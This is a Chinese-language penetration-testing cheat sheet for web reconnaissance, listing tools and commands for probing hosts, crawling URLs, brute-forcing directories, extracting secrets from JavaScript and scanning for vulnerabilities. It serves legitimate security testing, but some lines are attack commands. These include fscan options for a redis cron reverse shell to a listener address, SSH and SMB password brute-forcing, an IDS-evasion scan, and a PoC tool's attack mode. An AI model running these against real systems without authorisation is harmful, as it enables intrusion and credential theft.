web系统
========================================

HTTP Probing 收集
----------------------------------------
+ httpx
	- 快速http请求
	- 项目地址：``https://github.com/projectdiscovery/httpx``
	- 安装：``go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest``
	- ``cat subdomain.txt | httpx -title -sc -cl -location -fr -threads 200 -o httpx.txt``
	- ``cat subdomain.txt | httpx -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt``
	- ``cat subdomain.txt | httpx -sc -title -server -td -ports 80,443,8080,8000,8888 -threads 200``
+ aquatone
	- 抓取存活域名的网页截图
	- 项目地址：``https://github.com/michenriksen/aquatone``
	- ``cat hosts.txt | aquatone``
	- ``cat hosts.txt | aquatone -ports 80,443,8000,8080,8443``
	- ``cat hosts.txt | aquatone -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888``

URL 收集
----------------------------------------
在进行URL收集时，需要先进行子域名（包括top端口）存活检测，获取存活的子域名列表，然后再进行URL收集。

主动 Crawling
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ Katana
	- 项目地址： ``https://github.com/projectdiscovery/katana``
	- 安装： ``CGO_ENABLED=1 go install github.com/projectdiscovery/katana/cmd/katana@latest``
	- ``katana -u livesubdomains.txt -d 2 -o urls.txt``
+ Hakrawler
	- 项目地址： ``https://github.com/hakluke/hakrawler``
	- 安装： ``go install github.com/hakluke/hakrawler@latest``
	- ``cat urls.txt | hakrawler -u > urls3.txt``

被动 Crawling
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ gau
	- 项目地址： ``https://github.com/lc/gau``
	- 安装： ``$ go install github.com/lc/gau/v2/cmd/gau@latest``
	- ``cat livesubdomains.txt | gau | sort -u > urls2.txt``
	- ``echo example.com | gau --mc 200 | urldedupe > urls.txt``
+ UrlFinder
	- 项目地址：https://github.com/pingc0y/URLFinder
	- 介绍：快速、全面、易用的页面信息提取工具，用于分析页面中的js与url,查找隐藏在其中的敏感信息或未授权api接口
	- 用法
		::

			显示全部状态码
			URLFinder.exe -u http://www.baidu.com -s all -m 3

			显示200和403状态码
			URLFinder.exe -u http://www.baidu.com -s 200,403 -m 3

			导出全部
			URLFinder.exe -s all -m 3 -f url.txt -o .
			只导出html
			URLFinder.exe -s all -m 3 -f url.txt -o res.html
			结果统一保存
			URLFinder.exe -s all -m 3 -ff url.txt -o .
			
			URLFinder -u example.com | sort -u > urls3.txt
+ virustotal
	- 提取子域名： ``curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=example.com&apikey=[api-key]" | jq -r '.subdomains[]' > vt.txt``
	- 提取URL: 
+ Wayback Machine
	- 提取子域名： ``curl -s "http://web.archive.org/cdx/search/cdx?url=*.example.com/*&output=text&fl=original&collapse=urlkey" |sort| sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | sort -u > wayback.txt``
	- 提取URL: 
+ alienvault OTX
	- 提取URL: ``curl -s "https://otx.alienvault.com/api/v1/indicators/domain/example.com/url_list?limit=500&page=1" | jq -r '.url_list[].url'``
+ gospider：``https://github.com/jaeles-project/gospider``
+ crawlergo：``https://github.com/0Kee-Team/crawlergo``

目录扫描
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 注意
	+ 注意在目录探测中，对于关键的目录，需要递归进行扫描。
	+ 可根据robots.txt中的目录进行扫描。
- dirbuster
	+ dirbuster -H headless方式启动
	+ dirbuster ，默认GUI方式启动
	+ ``dirbuster -H -u http://www.xxx.com -l SecLists/Discovery/Web-Content/raft-large-directories.txt``
- dirmap
	+ 项目地址：``https://github.com/H4ckForJob/dirmap.git``
	+ 安装：``python3 -m pip install -r requirement.txt``
	+ 扫描单个目标：``python3 dirmap.py -i https://site.com -lcf`` 
	+ 扫描多个目标：``python3 dirmap.py -iF urls.txt -lcf`` 
- dirb
	+ ``穷举特定扩展名文件：dirb http://172.16.100.102 /usr/share/wordlists/dirb/common.txt -X .pcap`` 
	+ ``使用代理：dirb http://192.168.1.116  -p 46.17.45.194:5210`` 
	+ ``添加UA和cookie：dirb http://192.168.1.116 -a "***" -c "***"`` 
	+ ``扫描目录：dirb http://192.168.91.133 common.txt -N 404`` 
- `dirsearch <https://github.com/maurosoria/dirsearch>`_
	+ -u 指定网址
	+ -e 指定网站语言
	+ -w 指定字典
	+ -r 递归目录（跑出目录后，继续跑目录下面的目录）
	+ -random-agents 使用随机UA
	+ -x 排除指定响应码
	+ -i 包含指定响应码
	+ ``dirsearch -u https://example.com --full-url --deep-recursive -r``
	+ ``dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1``
- nikto
	+ ``常规扫描：nikto -host/-h http://www.example.com`` 
	+ ``指定端口(https)：nikto -h http://www.example.com -p 443 -ssl`` 
	+ ``指定目录：nikto -host/-h http://www.example.com -c /dvma`` 
	+ ``绕过IDS检测：nikto -host/-h http://www.example.com -evasion`` 
	+ ``Nikto配合Nmap扫描：nmap -p80 x.x.x.x -oG - \|nikto -host -`` 
	+ ``使用代理：nikto -h URL -useproxy http://127.0.0.1:1080`` 
- gobuster
	+ ``目录扫描: gobuster dir -u http://192.168.100.106 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt``
	+ ``文件扫描：gobuster dir -u http://192.168.100.106 -w /home/kali/Downloads/SecLists/Discovery/Web-Content/directory-list-1.0.txt -x php``
	+ ``不包含特定长度：--exclude-length 280``
	+ 批量脚本
	
		::
		
			trap "echo Terminating...; exit;" SIGINT SIGTERM

			if [ $# -eq 0 ]; then
				echo "Usage: ott http://host threads optionalExtensions"
				exit 1
			fi

			for f in /usr/share/dirb/wordlists/common.txt /usr/share/dirb/wordlists/big.txt /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt /usr/share/wordlists/raft/data/wordlists/raft-large-directories-lowercase.txt /usr/share/wordlists/raft/data/wordlists/raft-large-files-lowercase.txt /usr/share/wordlists/raft/data/wordlists/raft-large-words-lowercase.txt
			do
			  echo "Scanning: " $f
			  echo "Extensions: " $3
			  if [ -z "$3" ]; then
				gobuster -t $2 dir -f --url $1 --wordlist $f | grep "Status"
			  else
				gobuster -t $2 dir -f --url $1 --wordlist $f -x $3 | grep "Status"
			  fi
			done
		
		+ example:
		+ ott http://192.168.56.121 50
		+ ott http://192.168.56.121 50 .phtml,.php,.txt,.html
		

- `DirBrute <https://github.com/Xyntax/DirBrute>`_
- auxiliary/scanner/http/dir_scanner
- auxiliary/scanner/http/dir_listing
- auxiliary/scanner/http/brute_dirs
- DirBuster

隐藏参数扫描
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ Arjun
	- 项目地址： ``https://github.com/s0md3v/Arjun``
	- 安装： ``pip3 install arjun``
	- 被动扫描： ``arjun -u https://example.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"``
	- 主动扫描： ``arjun -u https://example.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"``

其它工具
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ urldedupe
	- url快速去重工具
	- 项目地址： ``https://github.com/ameenmaali/urldedupe``
	- 安装
		::

			git clone https://github.com/ameenmaali/urldedupe.git
			cd urldedupe
			cmake CMakeLists.txt
			make
	- ``echo example.com | gau --mc 200 | urldedupe > urls.txt``
+ uro
	- 智能过滤URL列表，去重和剔除无用内容，保留安全测试中有价值的URL。
	- 项目地址： ``https://github.com/s0md3v/uro``
	- 安装： ``pipx install uro``
	- ``cat urls.txt | uro``
+ 提取有参数的URL 
	- ``cat allurls.txt | grep '=' | urldedupe | tee output.txt``
	- ``cat allurls.txt | grep -E '\?[^=]+=.+$' | tee output.txt``
+ Gf-Patterns
	- 项目地址： ``https://github.com/1ndianl33t/Gf-Patterns``
	- 安装
		::

			先要安装waybackurls & Gf
			go install github.com/tomnomnom/waybackurls@latest
			go install github.com/tomnomnom/gf@latest
			安装MY Gf Patterns installation
			git clone https://github.com/1ndianl33t/Gf-Patterns
			mkdir ~/.gf
			mv ./Gf-Patterns/*.json ~/.gf
	- ``cat subdomains.txt | waybackurls | sort -u >> waybackdata | gf ssrf | tee -a ssfrparams.txt``
	- ``cat urls.txt | gf redirect | tee -a redirect.txt``
	- ``gf ssrf,gf redirect,gf lfi,gf rce,gf ssti,gf idor,gf xxe,gf debug_logic``
+ 敏感格式文件提取
	- js文件： ``cat allurls.txt | grep '\.js$'|tee jsurls.txt``
	- ``cat allurls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"``
	- ``cat allurls.txt | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"``

敏感信息
------------------------------------------

js信息搜集
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ js_info_finder
	- 项目地址： ``https://github.com/laohuan12138/js_info_finder``
	- url扫描： ``python js_info_finder.py -u http://example.com``
	- js url: ``python js_info_finder.py -j http://example.com/js/app.js``
	- url文件： ``python js_info_finder.py -f urls.txt``
+ jssf
	- 项目地址： ``https://github.com/h6nt3r/jssf``
	- 安装： ``go install -v github.com/h6nt3r/jssf@latest``
	- js url: ``jssf -u "http://testphp.vulnweb.com/medias/js/common_functions.js" -secrets -o out.txt``
	- url文件： ``jssf -f js.txt -secrets -o jssf_output.txt``
+ JSFinder
	- 快速在网站的js文件中提取 **URL，子域名** 的工具。
	- 项目地址： ``https://github.com/Threezh1/JSFinder``
	- 用法：
		+ 简单爬取: ``python JSFinder.py -u http://www.mi.com``
		+ 深度爬取: ``python JSFinder.py -u http://www.mi.com -d``
+ JSINFO-SCAN
	- 递归爬取域名，以及递归从 JS 中获取信息的工具。
	- 项目地址： ``https://github.com/p1g3/JSINFO-SCAN``
	- ``python jsinfo.py --target https://www.example.com --keywords example``
	- 注：递归速度比较慢，适合单个url或者js，不输入https，它会默认使用http，失败的话在末尾添加/index.html
+ FindSomething
	- 项目地址：https://github.com/momosecurity/FindSomething
	- 介绍：浏览器插件，全面的敏感信息被动提取。
+ mantra
	- 项目地址： ``https://github.com/brosck/mantra``
	- 安装： ``go install github.com/Brosck/mantra@latest``
	- ``cat js.txt|mantra -d |grep '+'``
+ hanz0
	- 项目地址： ``https://github.com/r3dcl1ff/hanz0``
	- 安装
		::

			git clone https://github.com/r3dcl1ff/hanz0
			cd hanz0 && go build hanz0.go
	- ``cat js.txt | ./hanz0 -s High,Medium``
+ Packer Fuzzer
	- 项目地址：https://github.com/hyr0ky/PackerFuzzer
	- 介绍：针对Webpack等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具.

敏感文件扫描
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ Google Dork for Files: ``site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)``

备份文件扫描
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ ihoneyBakFileScan_Modify
	- 项目地址：https://github.com/VMsec/ihoneyBakFileScan_Modify


综合扫描
----------------------------------------

侧重内网
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ fscan
	- 项目地址：``https://github.com/shadow1ng/fscan``
	- 示例
		::
		
			fscan.exe -h 192.168.1.1/24  (默认使用全部模块)  
			fscan.exe -h 192.168.1.1/16  (B段扫描)
			fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)  
			fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)  
			fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)  
			fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)  
			fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)  
			fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)  
			fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径)   
			fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )  
			fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)  
			fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)  
			fscan64.exe -h 10.10.180.0-10.10.180.255 -p 445 -sc ms17|findstr "MS17-010"（指定模块）
			fscan.exe -hf ip.txt  (以文件导入)
+ Template 
	- 项目地址：https://github.com/1n7erface/Template
+ SweetBabyScan
	- 项目地址：``https://github.com/inbug-team/SweetBabyScan``
	- 轻量级内网资产探测漏洞扫描工具，支持弱口令爆破的内网资产探测漏洞扫描工具，集成了Xray与Nuclei的Poc
+ Ladon
	- 项目地址：``https://github.com/k8gege/Ladon``
	- 大型内网渗透扫描器\域渗透\横向工具，PowerShell模块、Cobalt Strike插件、内存加载、无文件扫描。内含端口扫描、服务识别、网络资产探测、密码审计、高危漏洞检测、漏洞利用、密码读取以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描等。
+ goon
	- 项目地址（停止维护）：``https://github.com/i11us0ry/goon``
	- goon,集合了fscan和kscan等优秀工具功能的扫描爆破工具。
	- 功能包含：ip探活、port扫描、web指纹扫描、title扫描、fofa获取、ms17010、mssql、mysql、postgres、redis、ssh、smb、rdp、telnet等爆破以及如netbios探测等功能。


侧重外网
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ ARL 资产侦察灯塔系统
	::

		git clone https://github.com/TophantTechnology/ARL
		cd ARL/docker/
		docker volume create arl_db
		docker-compose pull
		docker-compose up -d 
		
		默认端口5003 (https), 默认用户名密码admin/arlpass
+ 带带弟弟
	- 项目：``https://github.com/SleepingBag945/dddd``
	- 示例：
		::
		
			# 指定IP禁Ping全端口扫描指定端口
			./dddd -t 172.16.100.1 -p 80,53,1433-5000 -Pn
			先配置./config/subfinder-config.yaml中的FOFA 邮箱和KEY。
				fofa: ["xxxx@qq.com:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"]
			./dddd -t "domain=\"baidu.com\"" -fofa (从fofa取100个baidu.com域名的目标)
			./dddd -t "domain=\"baidu.com\"" -fofa -ffmc 10000 (指定最大数量为10000 默认100)
+ Milkyway
	+ 项目地址：https://github.com/polite-007/Milkyway
	+ ``milkyway_windows_amd64.exe -f 1.txt -m -c 100``
	+ ``milkyway_windows_amd64.exe -u www.baidu.com -m -c 100``
+ ShuiZe_0x727
	- 项目：``https://github.com/0x727/ShuiZe_0x727``
	- 协助红队人员快速的信息收集，测绘目标资产，寻找薄弱点。
	- 全方位收集相关资产，并检测漏洞。也可以输入多个域名、C段IP等。
+ EHole 
	- 项目地址：``https://github.com/EdgeSecurityTeam/EHole``
+ BBScan
	- 项目地址：https://github.com/lijiejie/BBScan
	- Web漏洞扫描工具，快速发现并定位可能存在弱点的目标
	- 扫描主机(包含C段):  ``python3 BBScan.py --host www.a.com --network 24``
	- 文件扫描：``python3 BBScan.py -f wandoujia.com.txt``
	- 目录扫描：``python3 BBScan.py -d targets/``
+ P1finger
	- 项目地址：https://github.com/P001water/P1finger
	- 红队行动下的重点 **资产指纹** 识别工具
	- 基于本地规则库的 Web 资产指纹识别
		::
		
			P1finger -u [target]
			P1finger -uf [target file] // -uf 指定url文件
	- 基于Fofa测绘系统的 Web 指纹识别
		::
		
			首次运行生成 p1fingerConf.yaml 配置文件,配置fofa的email和apikey
			P1finger -m fofa -u [target]
			P1finger -m fofa -uf [target file] -o file.xlsx // file.xlsx可自定义文件名
	- 代理模式
		::
		
			P1finger.exe -uf urls.txt -httpproxy 127.0.0.1:4781
			P1finger.exe -uf urls.txt -socks 127.0.0.1:4781
+ Railgun
	- 项目地址：``https://github.com/lz520520/railgun``
	- Railgun为一款GUI界面的渗透工具，将部分人工经验转换为自动化，集成了渗透过程中常用到的一些功能，目前集成了端口扫描、端口爆破、web指纹扫描、漏洞扫描、漏洞利用以及编码转换功能，后续会持续更新。
+ scan4all
	- 项目地址： ``https://github.com/GhostTroops/scan4all``
	- 15000+PoC漏洞扫描；[ 23 ] 种应用弱口令爆破；7000+Web指纹；146种协议90000+规则Port扫描；Fuzz、HW打点、BugBounty神器...
+ afrog
	- 项目地址：``https://github.com/zan8in/afrog``
	- 需要配置 ceye.io的key
	- ``afrog -t http://127.0.0.1 -config config.yaml -o 1.html``
	- ``afrog -T result.txt -config config.yaml -o 1.html``

漏洞扫描
----------------------------------
+ Nuclei
	+ 项目地址： ``https://github.com/projectdiscovery/nuclei``
	+ 安装： ``go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest``
	+ ``nuclei -u https://example.com -bs 50 -c 30``
	+ ``nuclei -l live_domains.txt -bs 50 -c 30``
	+ ``nuclei -l live_domains.txt -s critical,high -bs 50 -c 30``
+ poc
	- 项目地址：``https://github.com/tr0uble-mAker/POC-bomber``
	- 验证模式：``python3 pocbomber.py -u http://xxx.xxx``
	- 攻击模式：``python3 pocbomber.py -u http://xxx.xxx --poc="thinkphp2_rce.py" --attack``
	- -f :指定目标url文件(这里有bug，文件中的url必须http(s)://开头)
+ xray【web】
	- 全局配置
		+ --config 用于指定配置文件的位置，默认加载同目录的 config.yaml
		+ --log_level 用于指定全局的日志配置
		+ ``xray_windows_amd64.exe --log_level debug --config 1.yaml webscan --url xxx``
	- reverse命令
		+ 启用单独的盲打平台服务，盲打平台用于处理没有回显或延迟触发的问题
	- genca
		+ 用于快速生成一个根证书，主要用于被动代理扫描 HTTPS 流量时用到
	- subdomain
		+ 子域名扫描
		+ ``xray_windows_amd64.exe  subdomain --target example.com --text-output example.txt``
		+ ``xray_windows_amd64.exe subdomain --target example.com --console-ui --text-output example.txt``
	- webscan
		+ 扫描web漏洞，核心功能
		+ --plugins 配置本次扫描启用哪些插件, 不再使用配置文件中的配置
			- ``--plugins xss --plugins xss,sqldet,phantasm``
		+ --poc 配置本次扫描启用哪些 POC,因为所有 POC 隶属于 phantasm 插件, 所以该参数其实是 phantasm 插件独有的配置。
			- ``--plugins phantasm --poc poc-yaml-thinkphp5-controller-rce``
			- ``--plugins phantasm --poc "*thinkphp*"``
			- ``--plugins phantasm --poc "/home/test/pocs/*"``
			- ``--plugins phantasm --poc "/home/test/pocs/*thinkphp*" ...``
		+ 配置输入来源
			- --listen 
				+ 启动一个被动代理服务器作为输入，如 --listen 127.0.0.1:4444，然后配置浏览器或其他访问工具的 http 代理为 http://127.0.0.1:4444 就可以自动检测代理中的 HTTP 请求并进行漏洞扫描
			- --basic-crawler 
				+ 启用一个基础爬虫作为输入， 如 --basic-crawler http://example.com，就可抓取 http://example.com 的内容并以此内容进行漏洞扫描
			- --url 
				+ 用于快速测试单个 url，这个参数不带爬虫，只对当前链接进行测试。默认为 GET 请求，配合下面的 --data 参数可以指定 body，同时变为 POST 请求。
			- -uf
				+ 从文件加载url
			- --raw-request 
				+ 用于加载一个原始的 HTTP 请求并用于扫描，原始请求类似上面代码框中的原始请求，如果你用过 sqlmap -r，那么这个参数应该也很容易上手。
		+ 输出方式
			- --html-output 将结果输出为 html 报告, 报告样例
			- --webhook-output 将结果发送到一个地址
			- --json-output 将结果输出到一个 json 文件中
		+ 示例
			- ``xray_darwin_amd64 webscan --plugins xss --listen 127.0.0.1:1111 --html-output 1.html``
			- ``xray_darwin_amd64 --log_level debug webscan --plugins xss,cmd_injection --basic-crawler http://example.com --json-output 1.json``
			- ``xray_darwin_amd64 webscan --url http://example.com --data "x=y" --html-output 2.html --json-output 1.json``
			- ``xray_darwin_amd64 webscan --url http://example.com/ --webhook-output http://host:port/path``


Waf指纹
-----------------------------------------
- `identywaf <https://github.com/enablesecurity/identywaf>`_
- `wafw00f <https://github.com/enablesecurity/wafw00f>`_
- `WhatWaf <https://github.com/Ekultek/WhatWaf>`_
- nmap脚本
	+ ``--script=http-waf-detect``
	+ ``--script=http-waf-fingerprint``
- sqlmap
	+ ``sqlmap -u “www.xxx.com/xxx?id=1” --identify-waf``